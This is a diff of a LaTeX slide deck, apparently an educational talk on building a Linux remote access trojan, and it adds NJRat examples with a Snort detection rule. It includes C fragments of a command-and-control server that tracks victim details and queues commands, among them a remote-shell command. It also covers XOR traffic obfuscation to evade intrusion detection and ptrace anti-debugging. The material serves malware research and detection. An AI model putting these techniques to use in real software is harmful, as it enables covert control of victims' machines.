@@ -129,6 +129,7 @@
   \item{What is a RAT?}
   \item{Brief History of the RAT}
   \item{Why build a RAT?}
+  \item{Wild RATs}
   \item{The Laboratory RAT}
     \begin{itemize}
     \item{CnC Server}
@@ -138,7 +139,7 @@
     \end{itemize}
   \item{Evasion}
     \begin{itemize}
-    \item{NIDS/NIPS}
+    \item{NIDS (Network Intrusion Detection)}
     \item{Debugging}
     \item{Virtual Machines}
     \end{itemize}
@@ -215,6 +216,83 @@
 \end{frame}
 
 \begin{frame}
+  \frametitle{Wild RATs}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=9cm,keepaspectratio]{wild_rat}
+      \caption{Wild Rats Eating Garbage}
+    \end{figure}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{Wild RATs}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=11cm,keepaspectratio]{njrat}
+      \caption{NJRat in the Wild}
+    \end{figure}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{Wild RATs}
+  \framesubtitle{NJRat Whitepaper Article}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=12cm,keepaspectratio]{njrat_article}
+      \caption{NJRat Whitepaper Article from 360 Research}
+    \end{figure}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{Wild RATs}
+  \framesubtitle{NJRat CnC Code}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=6cm,keepaspectratio]{njrat_cnc}
+      \caption{NJRat Decompiled CnC Code after Unpacking}
+    \end{figure}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{Wild RATs}
+  \framesubtitle{NJRat CnC Code}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=8cm,keepaspectratio]{njrat_strings}
+      \caption{NJRat Interesting Strings}
+    \end{figure}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{Wild RATs}
+  \framesubtitle{NJRat Detection}
+  \begin{center}
+    \begin{tcolorbox}[title=njrat.rules,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        alert tcp any any -> \$EXTERNAL_NET any (
+          msg:"NJRat/Bladabindi APT-C-27 Variant CnC Beacon";
+          content:"medo2|2a 5f 5e|"; nocase; fast_pattern;
+          pcre:"/(inf|kl|msg|pl)medo2\x2a\x5f\x5e[a-z,0-9,\+\/,\=]{1,}/i";
+          flow:to_server,established;
+          reference:md5,382788bb234b75a35b80ac69cb7ba306;
+          reference:url,https://ti.360.net/blog/articles/analysis-of-apt-c-27;
+          classtype:trojan-activity;
+          sid:2000000;
+          rev:01;
+        )
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}
   \frametitle{Why Build a RAT?}
   \begin{center}
     \begin{figure}
@@ -233,7 +311,7 @@
   \item{Learning Experience}
   \item{Find Detection Limitations}
   \item{Research the Linux Malware Ecosystem}
-  \item{It's Cool}
+  \item{Some RATs fall Short (NJRat)}
   \item{Because I Can}
   \end{itemize}
 \end{frame}
@@ -276,6 +354,40 @@
 
 \begin{frame}[fragile]{}
   \frametitle{CnC Server}
+  \framesubtitle{Data Structure for Victims/Clients}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        #ifndef NET_CLIENT_BEACON
+        typedef struct{
+          int xor_key;                      // Packet XOR Key
+          sys_info_t sysinfo;               // System Info Data Structure
+        } net_client_beacon_t;
+        #define NET_CLIENT_BEACON
+        #endif
+
+        #ifndef SYS_INFO
+        typedef struct{
+          char uuid[SYS_UUID_SIZE];         // Victim UUID
+          char ip[SYS_PUBLIC_IP_SIZE];      // Public IP Address
+          char username[SYS_USERNAME_SIZE]; // Username
+          char hostname[SYS_HOSTNAME_SIZE]; // Hostname
+          `char release[SYS_RELEASE_SIZE];  // Kernel Version
+          char arch[SYS_ARCH_SIZE];         // Architecture
+          int cpu_usage;                    // CPU Usage
+          int ping;                         // Ping / Internet Speed
+        } sys_info_t;
+        #define SYS_INFO
+        #endif
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
   \framesubtitle{Create Victims Memory Data Structure}
   \begin{center}
     \begin{tcolorbox}[title=net.c,colback=black]
@@ -294,6 +406,34 @@
           }
           return v;                                         // Return Pointer to Data Structure Array
         }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Data Structure for Command Queue}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        #ifndef NET_SERVER_CMD_BEACON
+        typedef struct{
+          int xor_key;
+          bool status;
+          int command;
+          char uuid[SYS_UUID_SIZE];
+          char data[NET_MAX_DATA_SIZE];
+        } net_server_beacon_t;
+        #define NET_SERVER_CMD_BEACON 0
+        typedef struct{
+          char host[NET_DOMAIN_MAX];
+          int port;
+        } net_server_cmd_shell_t;
+        #define NET_SERVER_CMD_SHELL 1
+        #endif
       \end{minted}
     \end{minipage}
     \end{tcolorbox}
@@ -409,20 +549,20 @@
         void *net_t_client(void *args){
           net_t_client_args_t *p_args = args;
           int sock = p_args->client_fd;
-          net_client_beacon_t **p_victims = p_args->p_victims;
-          net_server_beacon_t **p_commands = p_args->p_commands;
-          net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
-          net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_server_beacon_t));
+          net_client_beacon_t **p_victims = p_args->p_victims;                             // Get Pointer
+          net_server_beacon_t **p_commands = p_args->p_commands;                           // Get Pointer
+          net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));  // Allocate Client
+          net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_server_beacon_t));  // Allocate Server
           while (true){
             bool command = false;
-            int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
+            int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);    // Read Client Beacons
             if (!read){ break; }
             if (read < 0){
               fprintf(stderr, "[-] %s\n", strerror(errno));
               free(p_net_client_beacon);
               pthread_exit(NULL);
             }
-            net_update_victims(p_net_client_beacon, p_victims);
+            net_update_victims(p_net_client_beacon, p_victims);                           // Update Victim Data
             // contuned ...
           }
         }
@@ -468,8 +608,71 @@
 \end{frame}
 
 \begin{frame}
+  \frametitle{NCurses}
+  \begin{center}
+    \includegraphics[width=12cm,keepaspectratio]{ncurses}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{NCurses}
+  \framesubtitle{What is it?}
+  \begin{tcolorbox}[title=\href{https://en.wikipedia.org/wiki/Ncurses}{ncurses.log},colback=gray]
+    NCurses - Also known as new curses, is a programming library providing an application programming interface (API) that allows the programmer to write text-based user interfaces in a terminal-independent manner. It is a toolkit for developing "GUI-like" application software that runs under a terminal emulator. It also optimizes screen changes, in order to reduce the latency experienced when using remote shells. - \href{https://en.wikipedia.org/wiki/Ncurses}{Wikipedia}
+  \end{tcolorbox}
+\end{frame}
+
+\begin{frame}
+  \frametitle{NCurses}
+  \framesubtitle{What are we using it for?}
+  \begin{itemize}
+  \item{View Victim UUID}
+  \item{View Victim CPU Status}
+  \item{View Victim Username}
+  \item{View Victim Architecture}
+  \item{View Victim IP Address}
+  \item{View Victim Ping}
+  \item{View Victim Kernel Version}
+  \item{Send Commands}
+  \item{Everything is Better in Terminal}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{NCurses}
+  \framesubtitle{Create The main window!}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        WINDOW *ncurses_wmain_create(int port,
+                                     net_client_beacon_t **p_victims,
+                                     net_server_beacon_t **p_commands){
+          WINDOW *win_main;                                                   // Main Window
+          win_main = initscr();                                               // Initalize Main Window
+          if (start_color() == ERR || !has_colors() || !can_change_color()){  // Check for Color Supported Terminal
+            fprintf(stderr, "%s\n", strerror(errno));
+            return false;
+          }
+          if (net_server_async(port, p_victims, p_commands) == false){        // Startup CnC Server ASYNC
+            fprintf(stderr, "[x] failed to initalize cnc server\n");
+            return false;
+          }
+          noecho();
+          curs_set(0);                                                        // Position the Cursor
+          init_pair(NCURSES_WMAIN_COLOR, COLOR_GREEN, COLOR_BLACK);           // Set Color Pair
+          wbkgd(win_main, COLOR_PAIR(NCURSES_WMAIN_COLOR));                   // Set Window Background
+          return win_main;                                                    // Return the Main Window
+        }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}
   \frametitle{Evasion}
-  \framesubtitle{How can we thwart most NIDS/NIPS?}
+  \framesubtitle{How can we thwart most NIDS?}
   \begin{center}
     \begin{figure}
       \includegraphics[width=6cm,keepaspectratio]{bypass_firewall}
@@ -496,7 +699,7 @@
 
 \begin{frame}[fragile]{}
   \frametitle{Evasion}
-  \framesubtitle{The Function to Bypass Most NIDS/NIPS}
+  \framesubtitle{The Function to Bypass Most NIDS}
   \begin{center}
     \begin{tcolorbox}[title=net.c,colback=black]
     \begin{minipage}{0.5\textwidth}
@@ -514,6 +717,17 @@
       \end{minted}
     \end{minipage}
     \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{Clear Dataframe vs XOR Dataframe}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=14cm,keepaspectratio]{tcp_xor_dataframe}
+      \caption{Comparison of TCP Dataframes}
+    \end{figure}
   \end{center}
 \end{frame}
 
@@ -593,7 +807,11 @@
     \begin{minipage}{0.5\textwidth}
       \begin{minted}[fontsize=\tiny]{c}
         bool re_ptrace(){
-          if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1){
+          if (ptrace(PTRACE_TRACEME, // __ptrace request
+                     0,              // pid_t
+                     1,              // *addr
+                     0               // *data
+             ) < 0){
             return true;
           } else{
             return false;
@@ -603,6 +821,15 @@
     \end{minipage}
     \end{tcolorbox}
   \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{Evasion}
+  \framesubtitle{PTRACE\_TRACEME}
+  \begin{tcolorbox}[title=ptrace.log,colback=gray]
+    PTRACE\_TRACEME \\
+       Indicate that this process is to be traced by its parent.  A process probably shouldn't  make this request if its parent isn't expecting to trace it. (pid, addr, and data are ignored.)\\
+  \end{tcolorbox}
 \end{frame}
 
 \begin{frame}[fragile]{}
